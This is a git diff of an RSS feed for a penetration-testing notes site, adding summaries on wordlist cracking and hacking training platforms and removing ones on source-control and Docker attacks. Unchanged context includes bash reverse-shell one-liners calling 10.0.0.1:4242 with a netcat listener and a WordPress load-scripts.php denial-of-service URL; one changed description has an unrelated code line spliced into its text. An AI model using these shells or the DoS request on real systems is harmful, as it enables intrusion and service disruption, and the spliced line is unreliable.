@@ -7,12 +7,32 @@
     <generator>Hugo -- gohugo.io</generator>
     <copyright>2022</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Brute Force Cracking</title>
+      <link>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</link>
+      <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</guid>
+      <description>Brute Force Cracking # Making wordslists # Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
+Crunch # crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst) @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including spac crunch 6 8 -t ,@@^^%% Cewl # cewl example.</description>
+    </item>
+    
+    <item>
+      <title>Training Grounds</title>
+      <link>https://www.grayhatfreelancing.com/docs/training_grounds/</link>
+      <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/training_grounds/</guid>
+      <description>Training Grounds # Online Websites and Communities # HackTheBox.EU &amp;amp; HTB Catalogue Hackthebox has online machines to hack, it&amp;rsquo;s a pretty solid training ground, I personally lean towards TryHackMe. But, you should practie everywhere and often. Try learning by doing retired machines following Ippsec videos. HackTheBox Academy is connected to HackerOne.
+TryHackMe Tryhackme is another formidable learning platform. Some rooms are simply walkthroughs where you can read, learn and basically just type what they tell you, other rooms require some self-study to complete and there&amp;rsquo;s also challenge rooms, CTFs and King of the Hill competition mode!</description>
+    </item>
+    
+    <item>
       <title>Updating a github repository after cloning</title>
       <link>https://www.grayhatfreelancing.com/posts/update-github-repo/</link>
       <pubDate>Wed, 28 Dec 2022 00:00:00 +0000</pubDate>
       
       <guid>https://www.grayhatfreelancing.com/posts/update-github-repo/</guid>
-      <description>Updating Github Repos # Yeah, I agree. Once they removed the easy ability to push updates to a repository after cloning (over http(s)). It&amp;rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3&amp;hellip; to-do/check list of steps for ease of reference!
+      <description>Updating Github Repos # println(&amp;ldquo;Hamming difference of: ${count}&amp;quot;)It&amp;rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3&amp;hellip; to-do/check list of steps for ease of reference!
 Create repository on Github - Go to the website and just create one using their form, get the empty skeleton Clone repository - git clone &amp;lt;your repo&amp;gt; Remove remotes - git remote remove origin Add SSH remotes - git remote add origin git@github.</description>
     </item>
     
@@ -49,7 +69,7 @@ We&amp;rsquo;re going to get started by adding olympus.thm to our /etc/hosts fil
       <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
       
       <guid>https://www.grayhatfreelancing.com/docs/wordpress/</guid>
-      <description>Wordpress Tools: # https://github.com/wpscanteam/wpscan - One of the better tools at it&amp;rsquo;s just. &amp;ndash; gem install wpscan &amp;ndash; docker pull wpscanteam/wpscan &amp;ndash; wpscan &amp;ndash;update # updates the database &amp;ndash; Users of pentesting distrobutions generally should install the version from their repository. https://github.com/nullfil3/xmlrpc-scan https://github.com/relarizky/wpxploit Wordpress Tricks: # load-scripts.php denial of service # load-scripts.php resource exhaustion Wordpress versions 4.9.3 and prior:
+      <description>WordPress Security # Wordpress Tools: # https://github.com/wpscanteam/wpscan - One of the better tools at it&amp;rsquo;s just. &amp;ndash; gem install wpscan &amp;ndash; docker pull wpscanteam/wpscan &amp;ndash; wpscan &amp;ndash;update # updates the database &amp;ndash; Users of pentesting distrobutions generally should install the version from their repository. https://github.com/nullfil3/xmlrpc-scan https://github.com/relarizky/wpxploit Wordpress Tricks: # load-scripts.php denial of service # load-scripts.php resource exhaustion Wordpress versions 4.9.3 and prior:
 /wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter Check IP behind Cloudflare # https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/ Get the IP address of a target wordpress website by abusing the ping-back feature</description>
     </item>
     
@@ -287,26 +307,6 @@ Get-SQLDatabase -Username sa -Password Password1234 -Instance &amp;#34;&amp;lt;D
       
       <guid>https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/</guid>
       <description>Reverse Shell Cheat Sheet # Tools # reverse-shell-generator - Hosted Reverse Shell generator (source) revshellgen - CLI Reverse Shell generator Reverse Shell # Bash TCP # bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/4242; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 /bin/bash -l &amp;gt; /dev/tcp/10.0.0.1/4242 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1 Bash UDP # Victim: sh -i &amp;gt;&amp;amp; /dev/udp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 Listener: nc -u -lvp 4242 Don&amp;rsquo;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</description>
-    </item>
-    
-    <item>
-      <title>Source Code Management</title>
-      <link>https://www.grayhatfreelancing.com/docs/source_code_management/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/source_code_management/</guid>
-      <description>Source Code Management # Enumeration # Using SCMKit - Source Code Management Attack Toolkit
-Discover repositories being used in a particular SCM system SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local Search for repositories by repository name in a particular SCM system SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o &amp;#34;some search term&amp;#34; SCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.</description>
-    </item>
-    
-    <item>
-      <title>Docker Security</title>
-      <link>https://www.grayhatfreelancing.com/docs/docker_pentesting/</link>
-      <pubDate>Wed, 26 Oct 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/docker_pentesting/</guid>
-      <description>Docker Pentest # Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.
-Tools # Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow .</description>
     </item>
     
   </channel>
